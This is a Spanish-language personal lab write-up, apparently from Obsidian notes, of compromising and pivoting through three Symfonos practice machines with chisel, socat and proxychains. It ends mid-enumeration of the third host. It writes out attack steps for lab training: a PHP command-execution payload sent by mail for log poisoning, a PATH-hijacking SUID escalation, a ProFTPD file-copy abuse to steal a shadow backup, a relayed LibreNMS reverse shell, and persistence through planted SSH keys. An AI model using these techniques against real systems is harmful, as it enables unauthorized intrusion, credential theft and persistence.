[[Lab Pivoting and Tunneling - Synfonos]]
#pivoting #Linux #tecnicas
en este laboratorios vamos a realizar pruebas de pivoting y Tunneling entre 3 maquinas synfonos (1,2,3) 

primero vamos a identificar nuestra interfaz de red para saber en que segmento estamos operando y luego vamos a realizar un escaneo de nuestra red para identificar posibles maquinas que estén activas

```python
	ifconfig

	sudo apr-scan -I eth0 --localnet

	netdiscover -i eth0 -r ip
```

![[Pasted image 20240617144232.png]]

# MAQUINA SYNFONOS 1 - 10.0.2.5

### nmap

```python
# Nmap 7.94SVN scan initiated Mon Jun 17 15:26:13 2024 as: nmap -p- --open -sCV -sS -Pn -n --min-rate 5000 -oN Scan 10.0.2.15
Nmap scan report for 10.0.2.15
Host is up (0.0013s latency).
Not shown: 65530 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=symfonos
| Subject Alternative Name: DNS:symfonos
| Not valid before: 2019-06-29T00:29:42
|_Not valid after:  2029-06-26T00:29:42
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.25 (Debian)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:19:95:4B (Oracle VirtualBox virtual NIC)
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2024-06-17T14:26:26-05:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
| smb2-time: 
|   date: 2024-06-17T19:26:27
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 17 15:26:27 2024 -- 1 IP address (1 host up) scanned in 14.31 seconds
```

### Enumeración del puerto 80 (http)
analizamos el sitio web que no parece tener nada mas que un simple imagen
![[Pasted image 20240617153736.png]]

`Codigo Fuente`
en el código fuente no encontramos nada interesante 
![[Pasted image 20240617153840.png]]

### Enumeración del puerto 445 (smb)
al realizar una enumeración de los recursos compartidos encontramos que tenemos permios de lectura sobre el recurso compartido `anonymous`
![[Pasted image 20240617154042.png]]

### smbclient
utilizaremos la herramienta `smbclient` para iniciar una conexión con una `NULL-SESSION` en el recurso compartido y descargamos el archivo con `get`
![[Pasted image 20240617155753.png]]

`attention.txt`
este archivo contiene una nota de la cual podemos extraer 3 passwords y también un usuario así que vamos a guardar esta información en nuestra maquina 
![[Pasted image 20240617160155.png]]

### crackmapexec
usamos `crackmapexec` para enumerar usuarios validos en el sistema y obtuvimos el usuarios `helios` 
![[Pasted image 20240617160709.png]]

### smbmap
establecemos una conexión con `smbmap` a los recursos compartidos con las credenciales que hemos conseguido y ahora tenemos lectura sobre un recurso llamado helios/
![[Pasted image 20240617161332.png]]

`helios`
dentro del directorios de helios encontramos dos archivos que podemos descargar usando el siguiente comando 

```python
	❯ smbmap -H 10.0.2.15 -u helios -p qwerty --download helios/research.txt

	❯ smbmap -H 10.0.2.15 -u helios -p qwerty --download helios/todo.txt
```

![[Pasted image 20240617162359.png]]

`cat`
al leer los archivos el `research.txt` parece no ser nada importante. `todo.txt` parece ser una serie de tareas para trabajar sobre el dominio de `/h3l105` asi que vamos a ver a donde nos lleva este dominio
![[Pasted image 20240617162726.png]]

### Enumeración web
el `wappalyzer` nos indica que estamos ante un `wordPress 5.2.2` también logramos ver el dominio a donde nos estamos dirigiendo sin embargo no esta cargando correctamente
![[Pasted image 20240617163139.png]]

### etc/hosts
mirando el código fuente nos damos cuenta que la web esta tirando del dominio `synfonos.local` así que debemos agregar esto a nuestro hosts
![[Pasted image 20240617163418.png]]

`etc/hosts`
agregamos la ruta en nuestro archivo
![[Pasted image 20240617163631.png]]

### web
recargamos la pagina y podemos ver efectivamente como se esta cargando correctamente
![[Pasted image 20240617163729.png]]

### hacktricks
en la pagina de [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress) podemos obtener información de como enumerar plugins con el siguiente comando

```python
> curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```

![[Pasted image 20240617163950.png]]

### Enumeración de plugins WordPress
con este comando logramos enumerar los plugins

```python
> ❯ curl -H 'Cache-Control: no-cache, no-store' -L -ik -s http://symfonos.local/h3l105/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```

y con este comando vamos a limpiar el ouput para verlo de una mejor manera
```python
❯ curl -H 'Cache-Control: no-cache, no-store' -L -ik -s http://symfonos.local/h3l105/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2 | cut -d "/" -f 7 | sort -u
```

obtenemos dos plugins que parecen ser vulnerables
![[Pasted image 20240617165639.png]]

### searchsploit
encontramos tres exploits para este plugin así que vamos a ejecutarlos para tratar de obtener acceso 
![[Pasted image 20240617170025.png]]

`searchsploit -x php/webapps/40290.txt`
al parecer este plugin es vulnerable a un `LFI (Local File Inclusion)` lo que nos va a permitir leer archivos dentro de la maquina
![[Pasted image 20240617170237.png]]

### LFI (Local File Inclusion)
realizamos una petición a la ruta que nos indica la vulnerabilidad pasando el parámetro `/etc/passwd` logramos leer el archivo por lo que se ha ejecutado con exito el `LFI`

![[Pasted image 20240617170644.png]]

### Log mail poisoning 
debido a que podemos ver `log/` en el directorio `/var/mail/helios` podemos intentar acceder a los mail para intentar envenenar alguno y de esta manera conseguir un `RCE (Remote Code Execusion)`
![[Pasted image 20240617171417.png]]
![[Pasted image 20240617171433.png]]

### telnet 
si enviamos un mail usando telnet luego haciendo un `curl` al directorio `/var/mail/helios` podemos ver esa peticion. pero el codigo que enviamos no se esta mostrando por lo que parece que se esta interpretando

```python
telnet 10.0.2.15 25
Trying 10.0.2.15...
Connected to 10.0.2.15.
Escape character is '^]'.
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
MAIL FROM:gleoq@test.com
250 2.1.0 Ok
RCPT TO:helios@symfonos.localdomain
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
<?php echo system($_REQUEST['cmd']);?>

.
250 2.0.0 Ok: queued as 4F54440729

```

aqui podemos ver como el usuario `gleoq@test.com` ha enviado un correo a `helios@symfonos.localdomain`
![[Pasted image 20240617203318.png]]

`id`
agregamos el operador `&cmd=id` para hacer una prueba y efectivamente tenemos ejecución de comandos
![[Pasted image 20240617204332.png]]


### reverse shell

![[Pasted image 20240617205629.png]]

### Escalada de privilegios
el binario `/opt/statuscheck` es muy raro así que vamos a mirarlo
![[Pasted image 20240617211120.png]]

`/opt/statuscheck` 
vemos que el archivo esta haciendo un llamado al comando `curl` pero lo esta haciendo desde la ruta relativa. esto es muy peligroso ya que es vulnerable a `PATH HIJACKING`
![[Pasted image 20240617211311.png]]

### Path hijacking
El "path hijacking" (secuestro de rutas) es una técnica que explota la vulnerabilidad en la secuencia de búsqueda de archivos de un sistema operativo para ejecutar código malicioso. Este ataque se basa en la manipulación de la forma en que los sistemas y las aplicaciones localizan y cargan archivos ejecutables, bibliotecas, o scripts, redirigiendo el flujo de ejecución hacia un archivo malicioso en lugar del archivo legítimo

```python
> echo "chmod u+s /bin/bash" > curl (creamos un archivo llamado curl el cual comtiene comandos para cambiar los permisos de la bash)

> chmod +x curl (otorgamos permisos al archivo curl que hemos creado)

> export PATH=/tmp:$PATH (exportamos el directorio donde esta nuestro archivo al PATH)

> /opt/statuscheck (ejecutamos el binario donde tenemos permisos SUID)

> bash -p (llamamos una bash como root)

```

### Root
![[Pasted image 20240617212602.png]]

### chisel
enviamos el binario de chisel a la maquina victima usando el siguiente comando

```python
scp chisel root@ip:/dev/shm
```
`Nota: este comando es posible ya que hemos logrado persistencia en la maquian victima enviando nuestra authorized_kys para lograr una conexión via ssh. de lo contrario podemos montar un servidor en python y descargarlo con un wget`

![[Pasted image 20240618171950.png]]

### Tunneling And Pivoting
iniciamos un servidor en chisel escuchando por el puerto 8000

```python
	./chisel server --reverse -p 8000

	./chisel client 10.0.2.4:8000 R:socks
```

![[Pasted image 20240619124748.png]]

### proxychains
nos aseguramos que el archivo de configuración del proxychains tenga habilitada la opción `dynamic_chain` que la vamos a necesitar mas adelanta

```python
nano /etc/proxychains4.conf
```

![[Pasted image 20240618173459.png]]

### Reconocimiento de la segunda red
con un bucle `for` vamos hacer un reconocimiento de todas las `ips` que estén activas en el segundo segmento de red

```python
Synfonos-1 ip1: 10.0.2.5

Symfonos-1 ip2:10.2.2.6

	for i in {1..256} ;do (ping -c 1 10.2.2.$i | grep "bytes from" &) ;done
```

lanzamos este bucle en el segundo segmento (ip2) para reconocer las `ips` que estén activas en este segundo rango de `ips` 

```python
64 bytes from 10.2.2.1: icmp_seq=1 ttl=255 time=1.28 ms ||||| LOOPBACK
64 bytes from 10.2.2.2: icmp_seq=1 ttl=128 time=2.35 ms ||||| BROADCAST
64 bytes from 10.2.2.3: icmp_seq=1 ttl=255 time=0.283 ms||||| GET-WEY
64 bytes from 10.2.2.6: icmp_seq=1 ttl=64 time=0.013 ms Symfonos-1 ip:1
64 bytes from 10.2.2.7: icmp_seq=1 ttl=64 time=0.413 ms Symfonos-1 ip:2
```

![[Pasted image 20240618175115.png]]

### Escaneo de red symfonos-1 segmento de red 2

```python
	sudo proxychains nmap -sT -Pn -p 1-1000 -T5 -v -n 10.2.2.7
```

#Nota: hacemos un escaneo basico del top 1000 de los puertos comunes debido a que proxychains no es capas de manejar todo el volumen de los puertos. este escaneo basico nos permite identificar de manera rapida los puertos a los cuales tenemos conexion

![[Pasted image 20240618203733.png]]

### Transferencia de archivos

```python
	which nmap

	cp /usr/bin/nmap .

	python3 -m http.server 80
```

copiamos el binario de nmap a nuestro directorio actual y luego lo compartimos con un servidor de Python
![[Pasted image 20240618204241.png]]

`symfonos-1`
de esta manera obtenemos el binario de nmap en la maquina victima
![[Pasted image 20240618204545.png]]

### nmap scan synfonos-2
con el binario de nmap ejecutado desde la maquina victima(symfonos-1) confirmamos que estos son los puertos abiertos en la maquina
![[Pasted image 20240618205554.png]]

# Maquina Symfonos-2
### Proxychains scan synfonos-2
ahora que estamos seguro de todos los puertos podemos realizar un nuevo escaneo de nmap usando proxychains para obtener los servicios y las versiones que están corriendo en estos puertos

```python
	sudo proxychains nmap -sT -p 21,22,80,139,445 -sCV -Pn -n --min-rate 5000 10.2.2.7
```

![[Pasted image 20240618205838.png]]

`searchsploit ftp 1.3.5`
encontramos una vulnerabilidad para esta versión de ftp que nos permite copiar archivos. 
![[Pasted image 20240618211709.png]]

`proxychains ftp`
intentamos obtener una conexión como `anonymous` pero parece que no esta configurado por default así que por ahora no podemos hacer mucho por aqui. seguiremos enumerando
![[Pasted image 20240618211905.png]]

`proxychains smbmap` 
realizamos una enumeración de los recursos compartidos y vemos que tenemos permisos de lectura sobre el recurso compartido de `Anonymous`
![[Pasted image 20240618210839.png]]

`proxychains smbclient`
logramos descargar un archivo llamado `log.txt` para analizarlo en nuestra maquina
![[Pasted image 20240618211207.png]]

`log.txt`
en la primera linea podemos ver que el usuario `root` ha echo un `cat` sobre la ruta `/etc/shadow` y luego ha hecho una especie de copia de seguridad en la ruta `/var/backups/shadow.bak` 
![[Pasted image 20240618212903.png]]

`path`
en esta parte vemos que el recurso compartidos de `anonymous` se esta ejecutando bajo la ruta `/home/aelous/share` aquí podemos obtener un posible usuario `aelous` 
`aqui se me ocurre que si el usuario root esta haciendo una copia del /etc/shadow en esta dirección > /var/backups/shadow.bak y el servicio ftp es vulnerable a copias de archivos entonces nosotros podriamos traernos el archivo /var/backups a la dirección de /home/aelous/share y luego nos conectamos al recurso anonymous donde tenemos leptura y de esta manera podriamos ver el archivo` 
![[Pasted image 20240618213211.png]]

### Searchsploit
esta es la vulnerabilidad que vimos anteriormente que nos permite copiar archivos así que vamos a ver que nos dice..
```python
❯ searchsploit -x linux/remote/36742.txt
```
básicamente esta vulnerabilidad nos indica que podemos hacer `site cpfr /etc/passwd (la ruta que queremos copiar)` y después `site cpto /tmp/passwd.copy (ruta donde queremos hacer la copia)`
![[Pasted image 20240618214236.png]]

`proxychains telnet`
realizamos la copia efectiva del archivo al directorio donde tenemos permisos de lectura

```python
site cpfr /var/backups/shadow.bak

site cpto /home/aeolus/share/shadow.bak

250 Copy successful
```

![[Pasted image 20240618215019.png]]

`proxychains smbclient`
ahora nos conectamos al recurso compartido donde tenemos permisos de lectura y podemos ver el archivo así que lo descargamos para leerlo en nuestra maquina
![[Pasted image 20240618215312.png]]

`shadow.bak`
efectivamente aquí tenemos el archivo `shadow` de la maquina symfonos-2
![[Pasted image 20240618215530.png]]

### hashcat
copiamos las claves de los usuarios `aeolus y cronus` en un archivo llamado creds.tx y lo vamos a descifrar con hashcat
![[Pasted image 20240618220252.png]]

`Status`
obtenemos la clave del usuarios `aelous` ahora podemos usar estas credenciales para conectarnos por `ssh`
![[Pasted image 20240618220545.png]]

### proxychains ssh
nos conectamos a la maquina symfonos-2 vía ssh usando como intermedio a proxychains
![[Pasted image 20240618221228.png]]

### Enumeración web Symfonos-2 (Port 80)
en nuestra pantalla de `Pivoting And Tunneling` vamos a crear un nuevo tunel para traernos el puerto 80 de la maquina symgonos-2 de manera local en nuestro puerto 8090

```python
	❯ proxychains ssh aeolus@10.2.2.7 -L 8090:localhost:80
```

![[Pasted image 20240619132508.png]]

### web symfonos-2 (Port 80)
tenemos una web parecida a la symfonos-1 de momento no tenemos nada importante
![[Pasted image 20240619132257.png]]

### Fuzzing Symfonos-2
después de hacer Fuzzing no tenemos nada en esta web así que seguimos vamos a seguir enumerando para intentar obtener acceso privilegiado a la maquina
![[Pasted image 20240619134251.png]]

### Enumeración de puertos internos
primero que nada vamos a echar un vistazo a la web que esta corriendo en el puerto 80
![[Pasted image 20240619130754.png]]

### Enumeración web Symfonos-2 (Port 8080)
en nuestra pantalla de `Pivoting And Tunneling` vamos a crear un nuevo túnel para traernos el puerto 8080 de la maquina symgonos-2 de manera local en nuestro puerto 8181 
![[Pasted image 20240619142027.png]]

### web Symfonos-2 (Port 8080)
hemos logrado traernos el puerto 8080 de la maquina symfonos-2 el cual esta corriendo de manera local. a nuestra maquina atacante de manera local en el puerto 8181
![[Pasted image 20240619142317.png]]

### LibreNMS

![[Pasted image 20240619151707.png]]

hemos reutilizado las credenciales que de `aeolus` y obtenemos acceso a la web
![[Pasted image 20240619151518.png]]

### Vulnerabilidades
esta vulnerabilidad crea un nuevo dispositivo y luego lo registra de en la web para posteriormente llamarlo. en esca caso ejecutaremos esto de manera manual

| CVE-XXXX-XXXXX | Nombre de la vulnerabilidad                     | Tipo    | Nivel | Link                                                  |
| -------------- | ----------------------------------------------- | ------- | ----- | ----------------------------------------------------- |
| CVE-2018-20434 | LibreNMS 1.46 - 'addhost' Remote Code Execution | webapps | 9.8   | [LibreNMS](https://www.exploit-db.com/exploits/47044) |
|                |                                                 |         |       |                                                       |
|                |                                                 |         |       |                                                       |


`Add Divice`
aquí vamos a crear un dispositivo y llenamos los campos
![[Pasted image 20240619153907.png]]
`Add Divice`
la variable `payload` la pegamos en `community` y la opción `Force add` debe estar activa.

#Nota: es importante entender que para enviarnos una `reverse shell` a nuestra maquina `atacante` pero no tenemos conexión directa desde `symfonos-2` a nuestra `maquina atacante`. por lo tanto tenemos que enviar esta shell directamente a la maquina mas cercana entre la `symfonos-2` y la `maquina atacante`, en este caso seria la maquina `symfonos-1` donde estaremos a la escucha por el puerto `1221` y luego dirigir ese trafico a la maquina `atacante` donde estaremos a la escucha por el puerto `9001` 
![[Pasted image 20240619154619.png]]

`agregamos el dispositivo`
![[Pasted image 20240619155825.png]]

### socat
con un servidor en python nos compartimos el binario de `socat` con la maquina `symfonos-1`
![[Pasted image 20240619160023.png]]

`Descargamos el binario`
![[Pasted image 20240619160126.png]]

### Pivoting And Tunneling
ahora en nuestra pantalla de `Pivoting And Tunneling` vamos crear el túnel por donde vamos a recibir la información para luego redireccionarlo 
![[Pasted image 20240619162613.png]]

### Ejecución de LibreNMS 1.46 - 'addhost' Remote Code Execution'
ahora buscamos el dispositivo que hemos agregado y vamos a ejecutarlo. revisando el `exploit` vemos que hacen un llamado del dispositivo bajo la variable `capture` la cual vemos si vamos al meno engranaje `> capture > SNMP > Run` 
![[Pasted image 20240619162907.png]]

### conexión Symfonos-2 > Symfonos-1 > Maquina atacante (Attack)
logramos obtener conexión a la maquina `symfonos-2 pero como el usuario cronus`
![[Pasted image 20240619163334.png]]

### Escalada de privilegios Symfonos-2
en este caso tenemos permisos root para ejecutar el binario `/usr/bin/mysql/` vamos aprovechar esto para escalar privilegios
![[Pasted image 20240619164428.png]]

### GTFObins
debemos ejecutar esta instrucción para lograr obtener unas bash con privilegios
![[Pasted image 20240619174020.png]]

### Root
explotando este binario logramos conseguir una bash con privilegios elevados
#Nota: hacemos una copia de nuestra `authorized_keys` en la maquina `symfonos-2` para de esta manera asegurar la persistencia y así poder salir y entrar cuando queramos
![[Pasted image 20240619174131.png]]

# CONEXIÓN

```python
*Maquina Atacante*
> ./chisel server --reverse -p 8000

*Maquina Symfonos1*
> ./chisel client 10.0.2.4:8000 R:socks

*Tunneling*
> ./socat TCP-LISTEN:1221,fork TCP:10.0.2.4:9001

#Nota: para hacerlo de manera inversa, es decir. hacer una peticion a la symfonos-2 pasando por la maquina symfonos 1 debemos configurar otro tunel de socat de la siguiente manera:

*Maquina Symfonos 1*
./socat TCP-LISTEN:1331,fork TCP:10.2.2.7:9876 (Ip Symfonos-2)

*socat abre un puerto TCP en este caso le indicamos el 1331 y le decimos que toda la informacion que llegue a ese puerto sea redireccionada a la ip 10.2.2.7 en el puerto 9876* 
```


# EJEMPLO

```python
---------------------------------------------------------------------------------------------------------------------------------------
	*Enviar archivos desde maquina Symfonos-2 > Maquina Attack | Maquina Attack > Symfonos-2*
---------------------------------------------------------------------------------------------------------------------------------------

>tener establecido el canal de chisel servidor - cliente

	*Maquina Attack*
	./chisel server --reverse -p 8000	

	*Symfonos-1*
	./chisel client 10.0.2.4:8000 R:socks

---------------------------------------------------------------------------------------------------------------------------------------
	
	*Servidor Python: el servidor debe estar a la escucha en el mismo puerto donde se hace la conexion con socat*
	python3 -m http.server 6666

	*Maquina Symfonos-1*
	./socat TCP-LISTEN:1331,fork TCP:10.0.2.4:6666

	*abrimos un puerto en la maquina Symfonos-1 (1331) y vamos a enviar todo lo que llegue a ese puerto hacia el servidor de Python*

	*Maquina Symfonos-2*
	wget http://10.2.2.6:1331/archivo

---------------------------------------------------------------------------------------------------------------------------------------

	*Maquina Attack*
	wget http://10.0.2.5:1441/archivo

	*Maquina Symfonos-1*
	./socat TCP-LISTEN:1441,fork TCP:10.2.2.7:9999

	*abrimos un puerto en la maquina Symfonos-1 (1441) y vamos a enviar todo lo que llegue a ese puerto hacia el servidor de Python*

	python3 -m http.server 9999
```


[GraficoPivoting](obsidian://open?vault=ObsidianGIT&file=Excalidraw%2FPivoting.excalidraw) 

# Maquina Symfonos-3
en nuestra pantalla de `Tunneling And Ports` vamos a crear un nuevo túnel de socat en el puerto `3131` para que redirija el trafico hacia la `Maquina Attack` por el puerto `8000` 
![[Pasted image 20240622164436.png]]

### chisel 2
una vez tengamos creado el túnel de `socat` vamos a conectarnos con chisel al túnel de `socat` para la conexión sea redirigida hacia `Maquina Attack en el puerto 8000` con `chisel` nos conectamos a l`Maquina Symfonos-1 IP 10.2.2.6:3131` ya que esta es la interfaz que tiene visibilidad con `Symfonos-1` y le decimos que queremos una conexión de tipo `R:8888:socks` para que la conexión vaya por el puerto `8888`. de esta manera vemos en nuestro servidor de `chisel una nueva conexión proxy que viaja por el puerto 8888` 
![[Pasted image 20240622165133.png]]

### Barrido de ip
realizamos el barrido de red para identificar la ip de `Maquina Symfonos-3`

```python
> for i in {1..256} ;do (ping -c 1 10.3.2.$i | grep "bytes from" &) ;done

64 bytes from 10.3.2.1: icmp_seq=1 ttl=255 time=0.765 ms ||||| LOOPBACK
64 bytes from 10.3.2.2: icmp_seq=1 ttl=128 time=0.720 ms ||||| BROADCAST
64 bytes from 10.3.2.3: icmp_seq=1 ttl=255 time=0.212 ms ||||| GET-WEY
64 bytes from 10.3.2.6: icmp_seq=1 ttl=64 time=0.229 ms  ||||| Maquina Symfonos-3
64 bytes from 10.3.2.7: icmp_seq=1 ttl=64 time=0.013 ms  ||||| Maquina Symfonos-2

	*Maquina Symfonos-2*
	Interzas de red 1: 10.2.2.7
	Interfaz de red 2: 10.3.2.7

	*Maquina Symfonos-3*
	IP: 10.3.2.6 

```

![[Pasted image 20240622171654.png]]

### proxychains nmap 
realizamos un escaneo de nmap usando `proxychains` para que la conexión viaje por el túnel que hemos creado y podemos identificar los puertos abiertos
###### nmap 
```python
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5b
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:64:72:76:80:51:7b:a8:c7:fd:b2:66:fa:b6:98:0c (RSA)
|   256 74:e5:9a:5a:4c:16:90:ca:d8:f7:c7:78:e7:5a:86:81 (ECDSA)
|_  256 3c:e4:0b:b9:db:bf:01:8a:b7:9c:42:bc:cb:1e:41:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

![[Pasted image 20240622173854.png]]

### Enumeración Puerto 80 (Symfonos-3)
primero que nada debemos configurar un `proxy` en el navegador para que el trafico viaje por el puerto `8888` usamos `foxyproxy`
![[Pasted image 20240622174949.png]]

### web
de esta manera logramos tener conexión con `Symfonos-3` para enumerar la pagina web
![[Pasted image 20240622175113.png]]

`Codigo fuente`
la nota hace alguna referencia a `bust` se me ocurre que quizás deberíamos usar `gobuster` para intentar descubrir subdominios
![[Pasted image 20240622175304.png]]

### Fuzzing con gobuster
con este comando podemos realizar Fuzzing a la web pasando el trafico por el `proxy` usando la conexión `socks5://127.0.0.1:8888` 

```python
gobuster dir -u http://10.3.2.6/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 20 --proxy socks5://127.0.0.1:8888
```

![[Pasted image 20240622182352.png]]

`/gate`
vamos al dominio `/gate` y podemos ver otra imagen que esta en este dominio
![[Pasted image 20240622182657.png]]

`gobuster`
seguimos enumerando pero esta vez bajo el dominio de `gate`
![[Pasted image 20240622184438.png]]

`cyberus`
encontramos otra imagen en el dominio `cyberus`
![[Pasted image 20240622184358.png]]

`gobuster`
seguimos enumerando y encontramos otro dominio
![[Pasted image 20240622184613.png]]

`tartarus`
podemos ver otra imagen mas sobre el dominio `gate/cerberus/tartarus/` 
![[Pasted image 20240622184648.png]]

`gobuster`
seguimos enumerando y conseguimos otra ruta llamada `research`
![[Pasted image 20240622185358.png]]

`research`
aquí nos cuentan una historia bastante interesante. sim embargo esto parece ser un `rabbit hole` 
![[Pasted image 20240622185607.png]]

```python
	*Historia En Español*
Escondido en lo profundo de las entrañas de la tierra y gobernado por el dios Hades y su esposa Perséfone, el inframundo era el reino de los muertos en la mitología griega, el lugar sin sol al que iban las almas de los que morían después de la muerte. Regado por las corrientes de cinco ríos (Estigia, Aqueronte, Cocito, Flegetonte y Leteo), el Inframundo estaba dividido en al menos cuatro regiones: el Tártaro (reservado para los peores transgresores), los Campos Elíseos (donde sólo habitaban los hombres más excelentes). habitaban), los Campos de Luto (para aquellos que fueron heridos por el amor) y los Prados de Asfódelos (para las almas de la mayoría de la gente común y corriente).

La geografía del inframundo
Gran parte de lo que sabemos sobre cómo los antiguos griegos y romanos imaginaron el inframundo lo conocemos gracias a la Odisea de Homero y la Eneida de Virgilio. Sin embargo, incluso estas dos visiones son algo contradictorias, por lo que, en ocasiones, tenemos que recurrir a suposiciones para reconstruir el inframundo griego en su totalidad.

Entradas
Según Homero, el inframundo estaba situado más allá del río Océano, que rodea la Tierra, en el extremo occidental del mundo. Sin embargo, algunos otros autores nos informan que había bastantes lugares dentro del mundo conocido que podían usarse como portales para ingresar al reino de los muertos:

 Una caverna cerca de la antigua ciudad de Tenarus. Situada en la punta del promontorio medio del Peloponeso (conocido entonces como Cabo Tanaerum, y hoy llamado Cabo Matapan), la cueva existe hasta el día de hoy; Fue a través de esta cueva que Heracles arrastró a Cerbero fuera del Hades y Orfeo intentó traer a Eurídice de regreso al mundo de los vivos.

 El lago Alcioniano sin fondo en Lerna. Custodiado por la temible Hidra, el Lago Alcioniano supuestamente fue utilizado por Dioniso para ingresar al Inframundo y buscar a su madre Sémele; algunos incluso dicen que Hades secuestró a Perséfone en sus inmediaciones.

 El volcánico lago Averno. Ubicado en el sur de Italia, cerca de la ciudad de Nápoles, Averno se usaba a veces como sinónimo del inframundo en la época romana; Es a través de una cueva encontrada cerca de este lago que Eneas desciende al inframundo en la Eneida de Virgilio.

ríos
Según todos los relatos, el Inframundo era un lugar frío y sombrío, regado por las corrientes de cinco ríos infernales:

 La Estigia. Dando vueltas al Inframundo siete veces, Styx era el río del odio y de los juramentos inquebrantables; A menudo se representa a los dioses haciendo votos junto a sus aguas.

 El Aqueronte. El río de pena y dolor, negro y profundo.

 El Cocito. El río de lamentos y lamentos.

 El Flegetonte. El río de fuego, que posiblemente conduzca a las profundidades del Tártaro.

 El Leteo. El río del olvido y del olvido, del que las almas muertas están obligadas a beber para olvidar su vida terrena en preparación a una posible reencarnación.

Estructura
Inicialmente, parece que los antiguos griegos creían que todas las almas, por ejemplares o deshonrosas que hubieran sido sus vidas terrenales, acababan en el mismo lugar después de la muerte. Y para la mayoría de ellos, el Inframundo no podía haber sido un lugar particularmente agradable: era más bien como vivir la misma pesadilla sombría una y otra vez, luchando por respirar en un mundo habitado por sombras, desprovisto de esperanza, mal iluminado y desolado. . Y así es como a veces los autores antiguos describen el inframundo: nada más que un reino triste donde se suponía que los muertos se desvanecerían lentamente en la nada o, como aprendemos del Mito de Er de Platón, se prepararían para una reencarnación de regreso a la tierra.

Sin embargo, todo esto cambió en algún momento y, según escritores posteriores, el Inframundo se dividió en al menos cuatro regiones diferentes:

 Tártaro. En La Ilíada, Zeus afirma que el Tártaro está "tan debajo del Hades como el cielo está sobre la tierra y que es el golfo más profundo bajo la tierra, cuyas puertas son de hierro y el umbral de bronce". Originalmente el calabozo de los rebeldes contra el orden divino (los cíclopes y los hecatónquiros durante el reinado de Cronos, y los titanes una vez que Zeus llegó al poder), el Tártaro terminó albergando a los peores perpetradores, destinados aquí a soportar eternamente castigos acordes a sus necesidades. crímenes terrenales. Algunos de los habitantes más famosos del Tártaro fueron Sísifo, Tántalo, Ixión y Ticio.

 Los campos del luto. Como leemos en la Eneida, los Campos del Luto están reservados para las almas de aquellos a quienes el amor despiadado consumió; aquí vagan por senderos invisibles o en la oscuridad de un oscuro bosque de arrayanes: ni siquiera en la muerte han olvidado sus penas de antaño. Curiosamente, casi todos los habitantes del campo mencionados por Virgilio son mujeres: Fedra, Procris, Pasifae, Evadne, Laodamia y, por supuesto, Dido.

 Los prados de asfódelos. No sabemos mucho sobre Asphodel Meadows; podría haber sido un reino de absoluta neutralidad, pero sí sabemos que es allí donde Odiseo se encuentra con la sombra de Aquiles en La Odisea de Homero. No te aflijas en absoluto por tu muerte, Aquiles, le dice Odiseo, señalando al gran héroe que él es
```

`gobuster`
hemos cambiado el diccionario debido a que no hemos encontrado mas nada y volvemos a enumerar. en este caso el directorio `/cgi-bin/` se ve muy interesante
![[Pasted image 20240622185924.png]]

`cgi-bin/`
nos dice que el directorio es `Forbidden` quiere decir que es prohibido. pensando un poco me llama la atención la nota que hemos encontrado antes asi que vamos a apuntar hacia esa ruta `underworld`
![[Pasted image 20240622190203.png]]

`underworld`
parece que existe algún comando o software ejecutándose aquí. si recargamos la pagina podemos ver que se esta actualizando
![[Pasted image 20240622190406.png]]

### Vulnerabilidad cgi-bin
haciendo una búsqueda en internet sobre [cgi-bin/](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi) hemos encontrado información sobre esta vulnerabilidad que podría ayudarnos a explotarla.

